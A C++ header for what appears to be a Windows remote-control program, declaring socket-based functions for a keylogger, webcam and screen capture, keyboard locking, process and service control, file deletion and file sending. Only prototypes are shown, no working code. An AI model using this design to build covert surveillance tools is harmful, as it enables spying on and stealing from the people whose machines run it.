#ifndef UTILS_HPP
#define UTILS_HPP

#define WIN32_LEAN_AND_MEAN

#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <functional>
#include <filesystem>
#include <unordered_map>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>

#pragma comment(lib, "ws2_32.lib")

using namespace std;
using namespace cv;

#define PORT "8080"
#define BUFFER_SIZE 2048
#define SHUTDOWN_DELAY 15

extern stringstream inp, out;
extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
extern unordered_map<string, unordered_map<string, function<void()>>> handlers;

string drawTable(const vector<vector<string>>& rowData, const vector<string>& headers = {});
string getFileName(const string& filePath);
void getInstruction();
void listDir(const string& dirPath);
void listApps();
void startApp(LPWSTR appPath);
void stopApp(DWORD processID);
void listServices();
void startServiceByName(LPCWSTR serviceName);
void stopServiceByName(LPCWSTR serviceName);
void shutdownMachine();
void restartMachine();
void startKeylogger();
void stopKeylogger();
void startCamera();
void stopCamera();
void captureCamera();
void captureScreen();
void lockKeyboard();
void unlockKeyboard();
void deleteFile(LPCWSTR filePath);
void copyFile(LPCWSTR src, LPCWSTR dst);
void sendFile(SOCKET& socket, const string& filePath);

#endif // UTILS_HPP